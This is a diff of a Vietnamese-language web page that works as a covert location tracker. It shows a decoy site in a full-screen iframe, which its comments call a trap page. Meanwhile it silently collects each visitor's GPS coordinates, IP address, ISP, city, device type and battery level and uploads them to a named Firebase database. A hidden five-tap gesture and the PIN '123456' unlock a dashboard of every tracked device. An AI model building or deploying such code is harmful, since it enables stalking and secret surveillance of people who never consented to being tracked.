@@ -4,49 +4,26 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Trang Chủ</title>
-    
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body, html { width: 100%; height: 100%; font-family: Arial, sans-serif; background-color: #121212; color: #fff; overflow: hidden; }
 
-        /* 1. KHUNG CHỨA TRANG WEB ĐÁNH LẠC HƯỚNG (IFRAME FULL MÀN HÌNH) */
-        #decoyContainer {
-            width: 100%; height: 100vh; position: relative;
-        }
-        #decoyFrame {
-            width: 100%; height: 100%; border: none;
-        }
-        /* Lớp phủ trong suốt dùng để đếm lượt nhấp chuột mà không làm gián đoạn tương tác */
-        #clickOverlay {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 10; background: rgba(0,0,0,0);
-        }
+        #decoyContainer { width: 100%; height: 100vh; position: relative; }
+        #decoyFrame { width: 100%; height: 100%; border: none; }
+        #clickOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; background: rgba(0,0,0,0); }
 
-        /* 2. POPUP XÁC NHẬN NGƯỜI NHÀ */
-        .confirm-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85); z-index: 3000; justify-content: center; align-items: center;
-            backdrop-filter: blur(5px);
-        }
-        .confirm-card {
-            background: #222; border: 1px solid #ff4500; border-radius: 16px;
-            width: 90%; max-width: 320px; padding: 25px 20px; text-align: center;
-        }
+        .confirm-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 3000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
+        .confirm-card { background: #222; border: 1px solid #ff4500; border-radius: 16px; width: 90%; max-width: 320px; padding: 25px 20px; text-align: center; }
         .confirm-card h3 { font-size: 16px; color: #fff; margin-bottom: 20px; }
         .btn-group { display: flex; gap: 10px; }
         .btn-yes { background-color: #0088ff; color: #fff; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; flex: 1; }
         .btn-no { background-color: #444; color: #fff; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; flex: 1; }
 
-        /* 3. GIAO DIỆN BẢNG QUẢN TRỊ ĐỊNH VỊ */
         #dashboardView { display: none; padding: 20px; max-width: 600px; margin: 0 auto; height: 100vh; overflow-y: auto; }
         .dash-header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
         .dash-header h2 { color: #0088ff; font-size: 18px; }
 
-        .user-card {
-            background: #1e1e1e; border: 1px solid #333; border-radius: 12px;
-            padding: 15px; margin-bottom: 12px; cursor: pointer; transition: 0.2s;
-            display: flex; justify-content: space-between; align-items: center;
-        }
+        .user-card { background: #1e1e1e; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; display: flex; justify-content: space-between; align-items: center; }
         .user-card:hover { border-color: #0088ff; background: #252525; }
         .user-card.is-me { border-color: #ff3333; background: rgba(255, 51, 51, 0.05); }
 
@@ -55,11 +32,7 @@
         .basic-info { font-size: 12px; color: #aaa; line-height: 1.5; }
         .battery-text { color: #00ff66; font-weight: bold; }
 
-        /* 4. POPUP XEM CHI TIẾT KHI NHẬP PASS */
-        .modal-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85); z-index: 4000; justify-content: center; align-items: center;
-        }
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 4000; justify-content: center; align-items: center; }
         .modal-card { background: #1e1e1e; border: 1px solid #0088ff; border-radius: 16px; width: 90%; max-width: 360px; padding: 20px; }
         .info-list { list-style: none; font-size: 13px; line-height: 1.8; margin-top: 10px; }
         .info-list li { border-bottom: 1px solid #333; padding: 6px 0; display: flex; justify-content: space-between; }
@@ -68,15 +41,12 @@
 </head>
 <body>
 
-    <!-- 1. KHUNG CHỨA TRANG WEB BẪY CỦA BẠN -->
     <div id="decoyContainer">
-        <!-- Lớp phủ bắt sự kiện click 5 lần -->
         <div id="clickOverlay" onclick="detectMultiClick()"></div>
-        <!-- 💥 THAY LINK TRANG WEB CỦA BẠN VÀO THẺ IFRAME DƯỚI ĐÂY 💥 -->
+        <!-- DÁN LINK WEB BẪY CỦA BẠN VÀO DƯỚI ĐÂY -->
         <iframe id="decoyFrame" src="https://mvbrpk2vhk-cell.github.io/checkmap/"></iframe>
     </div>
 
-    <!-- 2. POPUP XÁC NHẬN NGƯỜI NHÀ -->
     <div id="confirmModal" class="confirm-overlay">
         <div class="confirm-card">
             <h3>Bạn có quen Minh Đức không?</h3>
@@ -87,7 +57,6 @@
         </div>
     </div>
 
-    <!-- 3. GIAO DIỆN BẢNG QUẢN TRỊ ĐỊNH VỊ -->
     <div id="dashboardView">
         <div class="dash-header">
             <h2>📱 Bảng Theo Dõi Thiết Bị Realtime</h2>
@@ -96,7 +65,6 @@
         <div id="userList"></div>
     </div>
 
-    <!-- 4. POPUP BẢNG THÔNG TIN CHI TIẾT (GPS / IP) -->
     <div id="infoModal" class="modal-overlay">
         <div class="modal-card">
             <div style="display: flex; justify-content: space-between; font-weight: bold; color: #0088ff;">
@@ -107,14 +75,13 @@
         </div>
     </div>
 
-    <!-- Firebase Library -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <script>
-        const DETAIL_PIN = "123456"; // Mật khẩu xem GPS chi tiết
+        const DETAIL_PIN = "123456";
 
-        // 💥 DÁN LINK FIREBASE CỦA BẠN VÀO ĐÂY 💥
+        // 💥 THAY LINK FIREBASE CỦA BẠN VÀO DÒNG DƯỚI 💥
         const firebaseConfig = { 
             databaseURL: "https://appdinhvi-558a5-default-rtdb.asia-southeast1.firebasedatabase.app/" 
         };
@@ -123,18 +90,22 @@
         try { 
             firebase.initializeApp(firebaseConfig); 
             db = firebase.database(); 
-        } catch(e){}
+        } catch(e){ console.error("Chưa cấu hình xong Firebase!"); }
 
-        const myUserId = "user_" + Math.random().toString(36).substr(2, 7);
+        // Cố định ID người dùng theo bộ nhớ trình duyệt
+        let myUserId = localStorage.getItem("tracker_device_id");
+        if (!myUserId) {
+            myUserId = "user_" + Math.random().toString(36).substr(2, 7);
+            localStorage.setItem("tracker_device_id", myUserId);
+        }
+
         let allUsersData = {};
         let clickCount = 0;
         let clickTimer = null;
 
-        // BẪY BẤM 5 LẦN LIÊN TỤC VÀO MÀN HÌNH
         function detectMultiClick() {
             clickCount++;
             clearTimeout(clickTimer);
-            // Giới hạn trong 2 giây phải bấm đủ 5 lần
             clickTimer = setTimeout(() => { clickCount = 0; }, 2000);
 
             if (clickCount >= 5) {
@@ -143,16 +114,13 @@
             }
         }
 
-        // XỬ LÝ NÚT CÓ / KHÔNG
         function confirmIdentity(isKnown) {
             document.getElementById('confirmModal').style.display = 'none';
             if (isKnown) {
-                // Nhấn CÓ: Ẩn trang bẫy và chuyển sang giao diện định vị
                 document.getElementById('decoyContainer').style.display = 'none';
                 document.getElementById('dashboardView').style.display = 'block';
                 renderUserList();
             } else {
-                // Nhấn KHÔNG: Quay lại trang web bẫy bình thường
                 alert("Rất tiếc, trang web này không dành cho bạn.");
             }
         }
@@ -168,100 +136,103 @@
             if (navigator.getBattery) {
                 try {
                     const b = await navigator.getBattery();
-                    battery = Math.round(b.level * 100) + "% " + (b.charging ? "🔌 (Đang sạc)" : "🔋");
+                    battery = Math.round(b.level * 100) + "% " + (b.charging ? "🔌" : "🔋");
                 } catch(e){}
             }
 
-            let ipData = { ip: "Đang lấy...", isp: "N/A", city: "N/A", lat: 0, lng: 0 };
+            let ipData = { ip: "Không xác định", isp: "N/A", city: "N/A", lat: 0, lng: 0 };
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                const res = await fetch('https://ipwho.is/');
                 const d = await res.json();
-                ipData = {
-                    ip: d.ip || "N/A",
-                    isp: d.org || d.asn || "N/A",
-                    city: d.city || "N/A",
-                    lat: d.latitude || 0,
-                    lng: d.longitude || 0
-                };
+                if(d.success) {
+                    ipData = {
+                        ip: d.ip || "N/A",
+                        isp: d.connection ? d.connection.isp : "N/A",
+                        city: d.city || "N/A",
+                        lat: d.latitude || 0,
+                        lng: d.longitude || 0
+                    };
+                }
             } catch(e){}
 
             return { os, device, battery, ...ipData };
         }
 
         async function startTracking() {
-    const info = await getSystemData();
+            const info = await getSystemData();
 
-    const pushData = (lat, lng, mode) => {
-        const myData = {
-            lat: lat,
-            lng: lng,
-            mode: mode,
-            deviceInfo: info,
-            status: "🟢 Đang Online", // Trạng thái khi đang mở web
-            time: new Date().toLocaleTimeString('vi-VN') + " " + new Date().toLocaleDateString('vi-VN')
-        };
+            const pushData = (lat, lng, mode) => {
+                const myData = {
+                    lat: lat,
+                    lng: lng,
+                    mode: mode,
+                    deviceInfo: info,
+                    status: "🟢 Đang Online",
+                    time: new Date().toLocaleTimeString('vi-VN') + " " + new Date().toLocaleDateString('vi-VN')
+                };
 
-        allUsersData[myUserId] = myData;
-        renderUserList();
+                if (db) {
+                    // Cập nhật thông tin máy này lên Firebase
+                    db.ref('network_users/' + myUserId).set(myData);
+                    // Đánh dấu offline khi thoát trang
+                    db.ref('network_users/' + myUserId + '/status').onDisconnect().set("🔴 Đã Thoát Web");
+                }
+            };
 
-        if (db) {
-            // 1. Lưu/Cập nhật thông tin thiết bị lên Firebase (Lưu mãi mãi)
-            db.ref('network_users/' + myUserId).set(myData);
-
-            // 2. Bỏ lệnh remove() cũ. Khi họ thoát web, chỉ chuyển trạng thái thành Offline chứ KHÔNG XÓA DỮ LIỆU
-            db.ref('network_users/' + myUserId + '/status').onDisconnect().set("🔴 Đã Thoát Web");
-            db.ref('network_users/' + myUserId + '/lastSeen').onDisconnect().set(new Date().toLocaleTimeString('vi-VN') + " " + new Date().toLocaleDateString('vi-VN'));
+            if ("geolocation" in navigator) {
+                navigator.geolocation.watchPosition(
+                    (pos) => pushData(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
+                    (err) => pushData(info.lat, info.lng, "Ước Tính Qua IP"),
+                    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+                );
+            } else {
+                pushData(info.lat, info.lng, "Ưước Tính Qua IP");
+            }
         }
-    };
 
-    if ("geolocation" in navigator) {
-        navigator.geolocation.watchPosition(
-            (pos) => pushData(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
-            (err) => pushData(info.lat, info.lng, "Ưước Tính Qua IP"),
-            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
-        );
-    } else {
-        pushData(info.lat, info.lng, "Ước Tính Qua IP");
-    }
-}
-
+        // LẮNG NGHE VÀ ĐỒNG BỘ TOÀN BỘ DANH SÁCH THIẾT BỊ TỪ FIREBASE REALTIME
+        if (db) {
+            db.ref('network_users').on('value', (snapshot) => {
+                allUsersData = snapshot.val() || {};
+                renderUserList();
+            });
+        }
 
         function renderUserList() {
-    const listEl = document.getElementById('userList');
-    if (!listEl) return;
-    
-    listEl.innerHTML = "";
+            const listEl = document.getElementById('userList');
+            if (!listEl) return;
+            
+            listEl.innerHTML = "";
 
-    Object.keys(allUsersData).forEach((id) => {
-        const u = allUsersData[id];
-        const info = u.deviceInfo || {};
-        const isMe = id === myUserId;
-        const statusText = u.status || "🔴 Đã Thoát Web";
+            Object.keys(allUsersData).forEach((id) => {
+                const u = allUsersData[id];
+                const info = u.deviceInfo || {};
+                const isMe = id === myUserId;
+                const statusText = u.status || "🔴 Đã Thoát Web";
 
-        const card = document.createElement('div');
-        card.className = `user-card ${isMe ? 'is-me' : ''}`;
-        card.onclick = () => openUserDetail(id);
+                const card = document.createElement('div');
+                card.className = `user-card ${isMe ? 'is-me' : ''}`;
+                card.onclick = () => openUserDetail(id);
 
-        card.innerHTML = `
-            <div>
-                <div class="device-title">
-                    ${info.device || 'Thiết bị ẩn'} 
-                    ${isMe ? '<span class="badge-me">BẠN</span>' : ''}
-                </div>
-                <div class="basic-info">
-                    Trạng thái: <b>${statusText}</b><br>
-                    Cập nhật: ${u.time || 'N/A'}
-                </div>
-            </div>
-            <div style="text-align: right;">
-                <div class="battery-text">${info.battery || 'N/A'}</div>
-                <div style="font-size: 11px; color: #0088ff; margin-top: 5px;">🔒 Xem GPS & IP</div>
-            </div>
-        `;
-        listEl.appendChild(card);
-    });
-}
-
+                card.innerHTML = `
+                    <div>
+                        <div class="device-title">
+                            ${info.device || 'Thiết bị ẩn'} 
+                            ${isMe ? '<span class="badge-me">BẠN</span>' : ''}
+                        </div>
+                        <div class="basic-info">
+                            Trạng thái: <b>${statusText}</b><br>
+                            Cập nhật: ${u.time || 'N/A'}
+                        </div>
+                    </div>
+                    <div style="text-align: right;">
+                        <div class="battery-text">${info.battery || 'N/A'}</div>
+                        <div style="font-size: 11px; color: #0088ff; margin-top: 5px;">🔒 Xem GPS & IP</div>
+                    </div>
+                `;
+                listEl.appendChild(card);
+            });
+        }
 
         function openUserDetail(userId) {
             const inputPin = prompt("🔑 Nhập Mật Khẩu để mở khóa Tọa Độ GPS & Địa Chỉ IP:");
@@ -296,4 +267,5 @@
     </script>
 </body>
 </html>
+
 
